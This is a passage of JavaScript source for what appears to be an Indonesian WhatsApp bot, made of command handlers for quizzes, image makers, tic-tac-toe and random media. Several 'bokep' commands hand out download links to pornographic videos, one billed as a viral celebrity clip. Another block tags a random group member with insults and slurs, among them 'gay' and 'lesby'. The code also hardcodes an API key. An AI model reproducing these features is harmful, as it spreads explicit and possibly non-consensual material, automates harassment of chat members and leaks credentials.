			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄?? 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\\nhttps://www.mediafire.com/file/y4we169b72f9jhp/Seleb+yang+viral+itu+😍.mp4/file' })				   
		 break
  //=========================================================  
     case 'bokep130':
				 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/aa0em8n11kwr42m/5_6109578205327262646.mp4/file' })				   
		 break
		case 'bokep129':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/aa0em8n11kwr42m/5_6109578205327262646.mp4/file' })				   
		 break
		case 'bokep128':
				 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/aa0em8n11kwr42m/5_6109578205327262646.mp4/file' })				   
		 break
		case 'tebakin': case 'tebakgambar':
					if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${ApiZeks}/api/tebakgambar?apikey=${zeksApikey}`)
                    resu = anu.result
                    tebak = resu.soal
                    jawaban = resu.jawaban
                    tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    console.log(jawaban)
                    tebakya = await getBuffer(tebak)
                    wann.sendMessage(from, tebakya, image, { quoted: mek, caption: "Jawaban salah auto harus donasi" })
                   await sleep(30000)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
                    break
				case 'caklontong':
					if (caklontong.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`https://x-restapi.herokuapp.com/api/caklontong?apikey=BETA`)
                    tebakya = anu.soal
                    tebak = `Pertanyaan : ${tebakya}`
                    jawaban = anu.jawaban
                    caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                    console.log(jawaban)
                    wann.sendMessage(from, tebak, text, { quoted: mek })
                   await sleep(30000)
                    if (caklontong.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete caklontong[sender.split('@')[0]]
                        fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                    }
                    break
				case 'family100':
					if (family.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`https://x-restapi.herokuapp.com/api/family100?apikey=BETA`)
                    tebakya = anu.soal
                    tebak = `Pertanyaan : ${tebakya}`
                    jawaban = anu.jawaban
                    family[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./database/family100.json", JSON.stringify(family))
                    console.log(jawaban)
                    wann.sendMessage(from, tebak, text, { quoted: mek })
                   await sleep(30000)
                    if (family.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete family[sender.split('@')[0]]
                        fs.writeFileSync("./database/family100.json", JSON.stringify(family))
                    }
                    break
				case 'tebakanime':
					if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`https://x-restapi.herokuapp.com/api/tebak-anime?apikey=BETA`)
                    tebak = anu.soal
                    jawaban = anu.jawaban
                    tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                    console.log(jawaban)
                    tebakya = await getBuffer(tebak)
                    wann.sendMessage(from, tebakya, image, { quoted: mek, caption: "Jawaban salah auto harus donasi" })
                   await sleep(30000)
                    if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakanime[sender.split('@')[0]]
                        fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                    }
                    break
            case 'suit': 
              if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
              const userspilih = q
              if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
              var computer = Math.random();
              if (computer < 0.34 ) {
              computer = 'batu';
              } else if( computer >= 0.34 && computer < 0.67) {
              computer = 'gunting';
              } else {
              computer = 'kertas';
}
              if ( userspilih == computer ) {
              reply(`Pertandingan Seri!`)
              } else if ( userspilih == 'batu' ) {
              if( computer == 'gunting' ) {
              reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
              } else {
              reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
}
              } else if ( userspilih == 'gunting' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
              } else {
              reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
}
              } else if ( userspilih == 'kertas' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
              } else {
              reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
}
}
              break

case 'tahta':  
                   if (args.length < 1) return reply(mess.noteks)
                   F = q
                   reply(mess.wait)
                   tahta = await getBuffer(`${ApiZeks}/api/hartatahta?text=${F}&apikey=${zeksApikey}`)
                   tahtah = `${mess.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(tahta, tahtah, sender)
                  break
       case 'ytgold':  
                   if (args.length < 1) return reply(mess.noteks)
                   F = q
                   reply(mess.wait)
                   ytgold = await getBuffer(`${ApiZeks}/api/gplaybutton?text=${F}&apikey=${zeksApikey}`)
                   ytgoldp = `${mess.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(ytgold, ytgoldp, sender)
                   break  
       case 'ytsilver':  
                   if (args.length < 1) return reply(mess.noteks)
                   F = q
                   reply(mess.wait)
                   ytsilver = await getBuffer(`${ApiZeks}/api/splaybutton?text=${F}&apikey=${zeksApikey}`)
                   ytsilverp = `${mess.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(ytsilver, ytsilverp, sender)
                   break  
              case 'bego':
      case 'tolol':
      case 'pinter':
      case 'pintar':
      case 'asu':
      case 'bodoh':
      case 'gay':
      case 'lesby':
      case 'bajingan':
      case 'jancok':
      case 'anjing':
      case 'ngentod':
      case 'ngentot':
      case 'monyet':
      case 'mastah':
      case 'newbie':
      case 'bangsat':
      case 'bangke':
      case 'sange':
      case 'sangean':
      case 'dakjal':
      case 'horny':
      case 'wibu':
      case 'puki':
      case 'pantex':
      case 'pantek':
      
      if (!isGroup) return reply(mess.only.group)
        membr = []
        const pff = groupMembers
        const go = groupMembers
        const goo = pff[Math.floor(Math.random() * pff.length)]
        const oe = go[Math.floor(Math.random() * go.length)]
        teks = `*Yang Paling ${command} Disini Adalah :* @${goo.jid.split('@')[0]} Awokawokk ${command}`
        membr.push(goo.jid)
        mentions(teks, membr, true)
        break        

case 'asupan':
 
 
asu = await getBuffer(`https://api.lolhuman.xyz/api/asupan?apikey=17486bd5a6dc19b0bae44527`)
wann.sendMessage(from, asu, video, { quoted: mek})
break
case 'asupan2': 
anu = await fetchJson(`https://api.lolhuman.xyz/api/asupan?apikey=17486bd5a6dc19b0bae44527`)
ano = await getBuffer(anu.result.result)
wann.sendMessage(from, ano, video, { quoted: mek})
break
case 'asupant3':
 
   
anu = await fetchJson(`https://api.lolhuman.xyz/api/asupan?apikey=17486bd5a6dc19b0bae44527`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, video, { quoted: mek})
break
case 'randombokep':
              bokep = body.slice(1)
              const bo =['https://www.mediafire.com/download/8hnhjcf3pseubgy','https://www.mediafire.com/download/cty9phda3d1s62u','https://www.mediafire.com/download/8hnhjcf3pseubgy']
              const kep = bo[Math.floor(Math.random() * bo.length)]
              wann.sendMessage(from, '*PERMINTAAN:* '+bokep+'\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI:* '+ kep, text, { quoted: ftrol, caption: `NI BOKEP SAYA DAPAT DARI *©wann* DOSA TANGGUNG SENDIRI🗿`})
              break
//Cecan
case 'cogan':
 
   
anu = await fetchJson(`https://api.lolhuman.xyz/api/random/cogan?apikey=${lolkey}`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
case 'cecan':
 
   
anu = await fetchJson(`https://api.lolhuman.xyz/api/random/cecan?apikey=${lolkey}`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
case 'cecanvietnam':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
   
anu = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/vietnam?apikey=ZeroYT7`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
case 'cecanrandom':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
   
anu = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/cecan?apikey=ZeroYT7`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
case 'cecanmalaysia':
 
   
anu = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/malaysia?apikey=ZeroYT7`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
case 'cecankorea':
 
   
anu = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/korea?apikey=ZeroYT7`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
case 'cecanindonesia':
 
   
anu = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/indonesia?apikey=ZeroYT7`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
case 'cecanjapan':
 
   
anu = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/japan?apikey=ZeroYT7`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
case 'cecanthailand':
 
   
anu = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/thailand?apikey=ZeroYT7`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
 case 'hijaber':
   
   
anu = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/hijaber?apikey=ZeroYT7`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
  case 'santuy':
   
   
anu = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/santuy?apikey=ZeroYT7`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, video, { quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
case 'ukty': 
   
   
anu = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ukty?apikey=ZeroYT77`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, video, { quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
case 'bocil':
  
   
anu = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/bocil?apikey=ZeroYT7`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, video, { quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
 case 'ghea':
 
   
anu = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ghea?apikey=ZeroYT7`)
ano = await getBuffer(anu.result.url)
wann.sendMessage(from, ano, video, { quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
case 'maker': case 'maker2': 
case 'maker3': case 'maker4':
 
   
if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/${command}?text=${c}&apikey=${YuzApi}`)
ano = await getBuffer(anu.result.results)
wann.sendMessage(from, ano, image, { quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
break
       case 'maker2d2': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
		case 'maker2d3': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
		case 'maker2d4': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'maker3d': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = body.slice(8)
					 
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'maker3d2': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'maker3d3': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${YuzApi}`)
					buffer1 = await getBuffer(anu.result.results)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'maker3d4': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${YuzApi}`)
					buffer1 = await getBuffer(anu.result.results)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'transformer': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'googletxt':
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} tsukasa|chan|kawai`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					ll3 = makell.split("|")[0];
					 
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'battlefield': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Yuzzu|Kamiyaka`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					 
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'coffeecup': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'coffeecup2': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'neon': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
             case 'glow': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=glow&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'summer': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/textmaker/alam?text=${makell}&theme=summer&apikey=${YuzApi}`)
					buffer1 = await getBuffer(anu.result.url)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'flower': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/textmaker/alam?text=${makell}&theme=flower&apikey=${YuzApi}`)
					buffer1 = await getBuffer(anu.result.url)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'burn': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/textmaker/random?text=${makell}&theme=text-burn&apikey=${YuzApi}`)
					buffer1 = await getBuffer(anu.result.url)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'quote': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=${YuzApi}`)
					buffer1 = await getBuffer(anu.result.url)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'wooden': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=${YuzApi}`)
					buffer1 = await getBuffer(anu.result.url)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break
			case 'golden': 
 
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} Wann Ofc`)
					makell = args.join(" ")
					 
					anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=${YuzApi}`)
					buffer1 = await getBuffer(anu.result.url)
					wann.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./wann.jpg')})
					break








default:break
		}
		if (isTTT && isPlayer2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❌
Player2 @${tty.player2.split('@')[0]}=⭕

${angka[1]}${angka[2]}${angka[3]}
${angka[4]}${angka[5]}${angka[6]}
${angka[7]}${angka[8]}${angka[9]}

Giliran = @${tty.player1.split('@')[0]}`
  wann.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }

if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
wann.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
}
}

if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '❌'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳Result Game Tictactoe 🎲

*Yeyyy Permainan Di Menangkan Oleh *@${tty.player1.split('@')[0]}*\n`
ucapan2 = `*🎳Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
wann.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Seri 🗿👌_*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❌

${ttt}

Giliran = @${tty.player2.split('@')[0]}`
 wann.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (wannofc == 'allmenuku') {
menu = `❏ 「 \`\`\`MENU ALL\`\`\` 」
├────────────────────
├ ${prefix}infogempa
├ ${prefix}herolist
├ ${prefix}herodetail [ _hero_ ]
├ ${prefix}google [ _search_ ]
├ ${prefix}gimage [ _search_ ]
├ ${prefix}wiki [ _search_ ]
├ ${prefix}mediafire [ _link_ ]
├ ${prefix}ytsearch [ _judul_ ]
├ ${prefix}ytmp4 [ _link yt_ ]
├ ${prefix}ytmp3 [ _link yt_ ]
├ ${prefix}play [ _judul lagu_ ]
├ ${prefix}video [ _judul video_ ]
├ ${prefix}tinyurl [ _link_ ]
├ ${prefix}fetch [ _link_ ]
├ ${prefix}igdl [ _link_ ]
├ ${prefix}tiktokdl [ _link_ ]
├ ${prefix}pinterest [ _search_ ]
├ ${prefix}lirik [ _judul_ ]
├ ${prefix}tourl [ _reply image/video_ ]
├ ${prefix}resepmasakan [ _judul_ ]
├ ${prefix}artimimpi [ _teks_ ]
├ ${prefix}bilangangka [ _angka_ ]
